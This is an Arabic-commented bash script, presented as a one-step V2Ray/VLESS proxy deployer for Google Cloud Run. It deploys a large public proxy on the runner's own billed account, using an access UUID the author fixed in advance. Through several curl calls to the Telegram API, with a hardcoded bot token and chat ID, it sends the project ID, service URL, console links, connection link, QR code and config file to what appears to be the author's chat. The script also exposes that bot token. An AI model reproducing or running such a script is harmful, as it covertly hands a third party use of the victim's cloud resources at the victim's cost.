#!/bin/bash
# ================================================
# 🚀 سكريبت إنشاء سيرفر V2Ray تلقائياً على Google Cloud
# ================================================

set -e

# ألوان للمخرجات
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
cat << "EOF"
╔═══════════════════════════════════════════════════════╗
║       🚀 V2Ray Auto Deploy - Custom Settings         ║
║        إعدادات مخصصة - خادم V2Ray عالي الأداء        ║
╚═══════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# ================================================
# 🔧 الإعدادات المخصصة
# ================================================
V2RAY_CONFIG="{
  \"path\": \"khalildz_@cvw_cvw\",
  \"uuid\": \"d2cb8181-233c-4d18-9972-8a1b04db0044\",
  \"port\": 8080
}"

CLOUD_RUN_SPECS="{
  \"memory\": \"16Gi\",
  \"cpu\": \"8\",
  \"timeout\": \"100s\",
  \"concurrency\": \"1000\",
  \"platform\": \"managed\",
  \"region\": \"us-central1\",
  \"allow_unauthenticated\": true,
  \"execution_environment\": \"gen2\",
  \"max_instances\": \"100\",
  \"min_instances\": \"0\"
}"

TELEGRAM_BOT_TOKEN="8273677432:AAFwcfGj87HMq3w10HkHqdHBkpo_IkGWQcI"

# ================================================
# 📦 1. تثبيت المتطلبات الأساسية
# ================================================
echo -e "${YELLOW}[1] 📦 تثبيت المتطلبات الأساسية...${NC}"

sudo apt-get update
sudo apt-get install -y \
    curl \
    wget \
    git \
    python3 \
    python3-pip \
    python3-venv \
    jq \
    unzip

# ================================================
# ☁️ 2. تثبيت Google Cloud SDK
# ================================================
echo -e "${YELLOW}[2] ☁️ تثبيت Google Cloud SDK...${NC}"

if ! command -v gcloud &> /dev/null; then
    echo -e "${GREEN}📥 جاري تثبيت Google Cloud SDK...${NC}"
    
    # إضافة مستودع Google Cloud SDK
    echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | \
    sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
    
    curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | \
    sudo gpg --dearmor -o /usr/share/keyrings/cloud.google.gpg
    
    # تثبيت SDK
    sudo apt-get update && sudo apt-get install -y google-cloud-sdk
    
    # تثبيت مكونات إضافية
    sudo apt-get install -y google-cloud-sdk-gke-gcloud-auth-plugin kubectl
else
    echo -e "${GREEN}✅ Google Cloud SDK مثبت مسبقاً${NC}"
fi

# ================================================
# 🔐 3. تسجيل الدخول إلى Google Cloud
# ================================================
echo -e "${YELLOW}[3] 🔐 تسجيل الدخول إلى Google Cloud...${NC}"

echo -e "${BLUE}========================================${NC}"
echo -e "${YELLOW}📋 تعليمات تسجيل الدخول:${NC}"
echo -e "1. سيفتح المتصفح تلقائياً"
echo -e "2. اختر حساب Google الخاص بك"
echo -e "3. وافق على الصلاحيات"
echo -e "4. عد إلى التيرمينال"
echo -e "${BLUE}========================================${NC}"

gcloud auth login --no-launch-browser 2>/dev/null || gcloud auth login

# ================================================
# 📁 4. إنشاء أو اختيار مشروع
# ================================================
echo -e "${YELLOW}[4] 📁 إعداد المشروع...${NC}"

# إنشاء مشروع جديد تلقائياً
PROJECT_ID="v2ray-server-$(date +%s)"
PROJECT_NAME="V2Ray High Performance Server"

echo -e "${GREEN}🚀 إنشاء مشروع جديد...${NC}"
gcloud projects create $PROJECT_ID --name="$PROJECT_NAME"
gcloud config set project $PROJECT_ID

echo -e "${GREEN}✅ تم إنشاء المشروع: $PROJECT_ID${NC}"

# ================================================
# ⚙️ 5. تفعيل APIs المطلوبة
# ================================================
echo -e "${YELLOW}[5] ⚙️ تفعيل خدمات Google Cloud...${NC}"

APIS=(
    "run.googleapis.com"
    "cloudbuild.googleapis.com"
    "containerregistry.googleapis.com"
    "compute.googleapis.com"
    "iam.googleapis.com"
    "logging.googleapis.com"
    "monitoring.googleapis.com"
)

for api in "${APIS[@]}"; do
    echo -e "${BLUE}🔧 تفعيل $api...${NC}"
    gcloud services enable $api --quiet
done

echo -e "${GREEN}✅ تم تفعيل جميع الخدمات${NC}"

# ================================================
# 🐳 6. إنشاء صورة Docker لـ V2Ray
# ================================================
echo -e "${YELLOW}[6] 🐳 بناء صورة Docker لـ V2Ray...${NC}"

# إنشاء مجلد العمل
mkdir -p ~/v2ray-deploy
cd ~/v2ray-deploy

# إنشاء Dockerfile
cat > Dockerfile << 'EOF'
FROM alpine:latest

# تثبيت المتطلبات
RUN apk add --no-cache \
    wget \
    unzip \
    openssl \
    ca-certificates \
    tzdata \
    bash

# إنشاء مجلدات
RUN mkdir -p /etc/v2ray /var/log/v2ray

# تحميل V2Ray
RUN wget -q -O /tmp/v2ray.zip \
    https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip && \
    unzip -q /tmp/v2ray.zip -d /tmp/ && \
    mv /tmp/v2ray /usr/local/bin/ && \
    mv /tmp/v2ctl /usr/local/bin/ && \
    chmod +x /usr/local/bin/v2ray /usr/local/bin/v2ctl && \
    rm -rf /tmp/*

# نسخ الإعدادات
COPY config.json /etc/v2ray/config.json

# إنشاء شهادة SSL
RUN openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/v2ray/privkey.pem \
    -out /etc/v2ray/fullchain.pem \
    -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost" 2>/dev/null

# المستخدم غير المميز
USER nobody

# المنفذ
EXPOSE 8080

# الأمر التشغيلي
CMD ["/usr/local/bin/v2ray", "-config", "/etc/v2ray/config.json"]
EOF

# ================================================
# ⚡ 7. إنشاء إعدادات V2Ray المخصصة
# ================================================
echo -e "${YELLOW}[7] ⚡ إنشاء إعدادات V2Ray المخصصة...${NC}"

cat > config.json << EOF
{
    "log": {
        "access": "/var/log/v2ray/access.log",
        "error": "/var/log/v2ray/error.log",
        "loglevel": "warning"
    },
    "inbounds": [{
        "port": 8080,
        "protocol": "vless",
        "settings": {
            "clients": [{
                "id": "d2cb8181-233c-4d18-9972-8a1b04db0044",
                "level": 0,
                "email": "user@v2ray.com"
            }],
            "decryption": "none"
        },
        "streamSettings": {
            "network": "ws",
            "security": "tls",
            "tlsSettings": {
                "certificates": [{
                    "certificateFile": "/etc/v2ray/fullchain.pem",
                    "keyFile": "/etc/v2ray/privkey.pem"
                }]
            },
            "wsSettings": {
                "path": "/khalildz_@cvw_cvw"
            }
        }
    }],
    "outbounds": [{
        "protocol": "freedom",
        "settings": {}
    }]
}
EOF

# ================================================
# 🚀 8. نشر السيرفر على Cloud Run
# ================================================
echo -e "${YELLOW}[8] 🚀 نشر السيرفر على Cloud Run...${NC}"

# إنشاء اسم فريد للسيرفر
SERVICE_NAME="v2ray-hp-$(date +%s)"
REGION="us-central1"

echo -e "${GREEN}🔨 بناء صورة Docker...${NC}"
gcloud builds submit --tag gcr.io/$PROJECT_ID/$SERVICE_NAME .

echo -e "${GREEN}☁️ نشر على Cloud Run مع الإعدادات المخصصة...${NC}"

gcloud run deploy $SERVICE_NAME \
  --image gcr.io/$PROJECT_ID/$SERVICE_NAME \
  --platform=managed \
  --region=$REGION \
  --allow-unauthenticated \
  --port=8080 \
  --memory=16Gi \
  --cpu=8 \
  --max-instances=100 \
  --min-instances=0 \
  --concurrency=1000 \
  --timeout=100s \
  --execution-environment=gen2 \
  --cpu-boost \
  --format=json > deployment.json

# استخراج الرابط
SERVICE_URL=$(jq -r '.status.url' deployment.json)

echo -e "${GREEN}✅ تم النشر بنجاح!${NC}"
echo -e "${GREEN}🔗 رابط السيرفر: $SERVICE_URL${NC}"

# ================================================
# 📊 9. إنشاء لوحة التحكم
# ================================================
echo -e "${YELLOW}[9] 📊 إنشاء لوحة التحكم...${NC}"

DASHBOARD_URL="https://console.cloud.google.com/run/detail/$REGION/$SERVICE_NAME/metrics?project=$PROJECT_ID"
LOGS_URL="https://console.cloud.google.com/run/detail/$REGION/$SERVICE_NAME/logs?project=$PROJECT_ID"
MONITORING_URL="https://console.cloud.google.com/monitoring/dashboards?project=$PROJECT_ID"

# ================================================
# 🤖 10. إرسال المعلومات إلى بوت تليجرام
# ================================================
echo -e "${YELLOW}[10] 🤖 إرسال المعلومات إلى بوت تليجرام...${NC}"

# استخراج النطاق من الرابط
DOMAIN=$(echo $SERVICE_URL | sed 's|https://||' | sed 's|/.*||')

# إنشاء روابط V2Ray
VLESS_URL="vless://d2cb8181-233c-4d18-9972-8a1b04db0044@${DOMAIN}:443?type=ws&security=tls&path=%2Fkhalildz_@cvw_cvw&host=${DOMAIN}&sni=${DOMAIN}&fp=chrome#GoogleCloud-V2Ray"

# إنشاء رسالة تليجرام
TELEGRAM_MESSAGE="🚀 *تم إنشاء سيرفر V2Ray بنجاح!*

📁 *المشروع:* \`$PROJECT_ID\`
🏷️ *اسم السيرفر:* \`$SERVICE_NAME\`
🌍 *المنطقة:* \`$REGION\`

⚡ *مواصفات السيرفر:*
├─ 💾 *الذاكرة:* 16Gi
├─ 🎯 *المعالج:* 8 CPUs
├─ ⏱️ *مهلة الطلب:* 100s
├─ 🔄 *الطلبات المتزامنة:* 1000
├─ 🚀 *بيئة التنفيذ:* الجيل الثاني
└─ 🌐 *الوصول العام:* ✅ مفعل

🔗 *رابط السيرفر:*
\`$SERVICE_URL\`

🔑 *معلومات الاتصال:*
├─ *UUID:* \`d2cb8181-233c-4d18-9972-8a1b04db0044\`
├─ *المسار:* \`/khalildz_@cvw_cvw\`
└─ *المنفذ:* \`443\`

📊 *لوحة التحكم:*
├─ 📈 [عرض المقاييس]($DASHBOARD_URL)
├─ 📝 [عرض السجلات]($LOGS_URL)
└─ 🔍 [مراقبة النظام]($MONITORING_URL)

🌐 *رابط VLESS:*
\`$VLESS_URL\`

⏰ *وقت الإنشاء:* $(date '+%Y-%m-%d %H:%M:%S')

📌 *حفظ هذه المعلومات في مكان آمن.*"

# إرسال الرسالة إلى التليجرام
echo -e "${GREEN}📤 جاري إرسال المعلومات إلى بوت تليجرام...${NC}"

curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
  -d chat_id="6951382399" \
  -d text="$TELEGRAM_MESSAGE" \
  -d parse_mode="Markdown" \
  -d disable_web_page_preview="true" > /dev/null

# إرسال رابط VLESS منفصل
curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
  -d chat_id="6951382399" \
  -d text="🔗 *رابط VLESS الكامل:*\n\`$VLESS_URL\`" \
  -d parse_mode="Markdown" > /dev/null

# ================================================
# 📱 11. إنشاء QR Code وإرساله
# ================================================
echo -e "${YELLOW}[11] 📱 إنشاء QR Code...${NC}"

# تثبيت متطلبات Python
pip3 install qrcode[pil] pillow

# إنشاء سكريبت Python لإنشاء QR Code
cat > generate_qr.py << 'EOF'
import qrcode
import sys

# البيانات من السطر الأول
data = sys.argv[1] if len(sys.argv) > 1 else ""

# إنشاء QR Code
qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=10,
    border=4,
)
qr.add_data(data)
qr.make(fit=True)

img = qr.make_image(fill_color="black", back_color="white")
img.save("vless_qr.png")
print("QR Code generated: vless_qr.png")
EOF

# تشغيل سكريبت إنشاء QR Code
python3 generate_qr.py "$VLESS_URL"

# تحويل الصورة إلى base64 وإرسالها
if command -v curl &> /dev/null && [ -f "vless_qr.png" ]; then
    # تحويل الصورة إلى base64
    BASE64_QR=$(base64 -w 0 vless_qr.png)
    
    # إرسال الصورة إلى التليجرام
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto" \
      -F chat_id="6951382399" \
      -F photo="data:image/png;base64,${BASE64_QR}" \
      -F caption="📱 QR Code للاتصال السريع" > /dev/null
fi

# ================================================
# 📄 12. إنشاء ملف الإعدادات الكامل
# ================================================
echo -e "${YELLOW}[12] 📄 إنشاء ملف الإعدادات الكامل...${NC}"

cat > v2ray_config.txt << EOF
==========================================
🚀 إعدادات سيرفر V2Ray - Google Cloud Run
==========================================

📋 المعلومات الأساسية:
• المشروع: $PROJECT_ID
• اسم السيرفر: $SERVICE_NAME
• المنطقة: $REGION
• رابط السيرفر: $SERVICE_URL
• النطاق: $DOMAIN

⚡ مواصفات السيرفر:
• الذاكرة: 16Gi
• المعالج: 8 CPUs
• مهلة الطلب: 100s
• الطلبات المتزامنة: 1000
• بيئة التنفيذ: الجيل الثاني
• الوصول العام: مفعل
• الحد الأقصى للنسخ: 100
• الحد الأدنى للنسخ: 0

🔑 إعدادات V2Ray:
• UUID: d2cb8181-233c-4d18-9972-8a1b04db0044
• المسار: /khalildz_@cvw_cvw
• المنفذ: 443
• البروتوكول: VLESS
• النقل: WebSocket (WS)
• الأمان: TLS

🌐 روابط التحكم:
• لوحة المقاييس: $DASHBOARD_URL
• سجلات النظام: $LOGS_URL
• المراقبة: $MONITORING_URL

🔗 رابط VLESS الكامل:
$VLESS_URL

📱 إعدادات التطبيقات:

1. V2RayN:
{
  "address": "$DOMAIN",
  "port": 443,
  "id": "d2cb8181-233c-4d18-9972-8a1b04db0044",
  "alterId": 0,
  "security": "auto",
  "network": "ws",
  "path": "/khalildz_@cvw_cvw",
  "host": "$DOMAIN",
  "tls": "tls",
  "sni": "$DOMAIN"
}

2. NekoBox:
vless://$(echo -n '{
  "v": "2",
  "ps": "Google Cloud V2Ray",
  "add": "'$DOMAIN'",
  "port": "443",
  "id": "d2cb8181-233c-4d18-9972-8a1b04db0044",
  "aid": "0",
  "scy": "auto",
  "net": "ws",
  "type": "none",
  "host": "'$DOMAIN'",
  "path": "/khalildz_@cvw_cvw",
  "tls": "tls",
  "sni": "'$DOMAIN'",
  "fp": "chrome"
}' | base64 | tr -d '\n')

3. Qv2ray:
• Type: VLESS
• Address: $DOMAIN
• Port: 443
• UUID: d2cb8181-233c-4d18-9972-8a1b04db0044
• Transport: WebSocket
• Path: /khalildz_@cvw_cvw
• TLS: Enabled
• SNI: $DOMAIN

⏰ وقت الإنشاء: $(date '+%Y-%m-%d %H:%M:%S')
==========================================
EOF

# إرسال ملف الإعدادات
curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
  -F chat_id="6951382399" \
  -F document=@"v2ray_config.txt" \
  -F caption="📄 ملف الإعدادات الكامل" > /dev/null

# ================================================
# 🎯 13. الاختبار والتحقق
# ================================================
echo -e "${YELLOW}[13] 🎯 اختبار السيرفر...${NC}"

# اختبار الاتصال بالسيرفر
echo -e "${GREEN}🔍 جاري اختبار الاتصال بالسيرفر...${NC}"
if curl -s -I --max-time 10 "$SERVICE_URL" | grep -q "HTTP"; then
    echo -e "${GREEN}✅ السيرفر يعمل بنجاح!${NC}"
else
    echo -e "${YELLOW}⚠️  قد يستغرق السيرفر بضع دقائق للبدء${NC}"
fi

# ================================================
# 📝 14. إنشاء سكريبت إدارة السيرفر
# ================================================
echo -e "${YELLOW}[14] 📝 إنشاء سكريبت إدارة السيرفر...${NC}"

cat > manage_server.sh << EOF
#!/bin/bash
# سكريبت إدارة سيرفر V2Ray

RED='\\033[0;31m'
GREEN='\\033[0;32m'
NC='\\033[0m'

case "\$1" in
    status)
        echo -e "\${GREEN}📊 حالة السيرفر:\${NC}"
        gcloud run services describe $SERVICE_NAME \\
          --platform=managed \\
          --region=$REGION \\
          --format="table[box](status.conditions[0].type:label=الحالة, status.conditions[0].status:label=النشاط, metadata.creationTimestamp:label=تاريخ_الإنشاء)"
        ;;
    logs)
        echo -e "\${GREEN}📝 سجلات السيرفر:\${NC}"
        gcloud run services describe $SERVICE_NAME \\
          --platform=managed \\
          --region=$REGION \\
          --format="value(status.url)"
        echo "لعرض السجلات الحية: gcloud run services logs tail $SERVICE_NAME --region=$REGION"
        ;;
    update)
        echo -e "\${GREEN}🔄 تحديث السيرفر:\${NC}"
        gcloud run services update $SERVICE_NAME \\
          --region=$REGION \\
          --memory=16Gi \\
          --cpu=8 \\
          --concurrency=1000
        ;;
    delete)
        echo -e "\${RED}⚠️  هل أنت متأكد من حذف السيرفر؟ (y/n): \${NC}"
        read -n 1 confirmation
        echo
        if [ "\$confirmation" = "y" ]; then
            gcloud run services delete $SERVICE_NAME \\
              --platform=managed \\
              --region=$REGION \\
              --quiet
            echo -e "\${GREEN}✅ تم حذف السيرفر\${NC}"
        else
            echo -e "\${GREEN}❌ تم الإلغاء\${NC}"
        fi
        ;;
    info)
        echo -e "\${GREEN}📋 معلومات السيرفر:\${NC}"
        echo "المشروع: $PROJECT_ID"
        echo "الاسم: $SERVICE_NAME"
        echo "المنطقة: $REGION"
        echo "الرابط: $SERVICE_URL"
        echo "النطاق: $DOMAIN"
        echo "UUID: d2cb8181-233c-4d18-9972-8a1b04db0044"
        echo "المسار: /khalildz_@cvw_cvw"
        echo "لوحة التحكم: $DASHBOARD_URL"
        ;;
    *)
        echo "استخدام: manage_server.sh [command]"
        echo "الأوامر:"
        echo "  status   - عرض حالة السيرفر"
        echo "  logs     - عرض السجلات"
        echo "  update   - تحديث السيرفر"
        echo "  delete   - حذف السيرفر"
        echo "  info     - عرض المعلومات"
        ;;
esac
EOF

chmod +x manage_server.sh

# ================================================
# 🎉 15. الانتهاء
# ================================================
echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}🎉 تم الانتهاء من إنشاء السيرفر بنجاح!${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "${YELLOW}📋 ملخص المعلومات:${NC}"
echo -e "🏷️  اسم السيرفر: $SERVICE_NAME"
echo -e "🌍 المنطقة: $REGION"
echo -e "🔗 الرابط: $SERVICE_URL"
echo -e "📊 لوحة التحكم: $DASHBOARD_URL"
echo -e "🔑 UUID: d2cb8181-233c-4d18-9972-8a1b04db0044"
echo -e "🛣️  المسار: /khalildz_@cvw_cvw"
echo -e "${BLUE}========================================${NC}"
echo -e "${YELLOW}🚀 أوامر الإدارة:${NC}"
echo -e "📊 عرض الحالة: ./manage_server.sh status"
echo -e "📝 عرض السجلات: ./manage_server.sh logs"
echo -e "🔄 التحديث: ./manage_server.sh update"
echo -e "🗑️  الحذف: ./manage_server.sh delete"
echo -e "📋 المعلومات: ./manage_server.sh info"
echo -e "${BLUE}========================================${NC}"
echo -e "${GREEN}✅ تم إرسال جميع المعلومات إلى بوت تليجرام${NC}"
echo -e "${BLUE}========================================${NC}"

# تنظيف الملفات المؤقتة
rm -f deployment.json generate_qr.py vless_qr.png 2>/dev/null || true
